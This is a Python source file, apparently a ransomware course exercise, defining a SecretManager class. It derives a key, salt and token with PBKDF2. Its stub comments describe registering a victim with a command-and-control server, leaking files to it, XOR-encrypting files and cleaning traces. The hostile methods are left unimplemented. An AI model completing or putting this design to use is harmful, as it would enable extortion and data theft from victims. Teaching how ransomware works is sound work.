from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:

        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=self.TOKEN_LENGTH, salt=salt, iterations=self.ITERATION)#On hache le sel en SHA256 (sur 16 bits)
        dk = kdf.derive(key)#on dérive le hachage avec la clé qui est elle aussi random
        return dk
    


    def create(self)->Tuple[bytes, bytes, bytes]:
         #On génère un sel et une clé aléatoires
        self._salt = os.urandom(self.SALT_LENGTH)
        key = os.urandom(self.KEY_LENGTH)
        # On crée une clé dérivée de la précédente et du sel en utilisant le PBKDF2HMAC
        self._key = self.do_derivation(self._salt, key)
        # On génère le token aléatoire
        self._token = os.urandom(self.TOKEN_LENGTH)
        return self._salt, self._key, self._token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        raise NotImplemented()

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        raise NotImplemented()

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()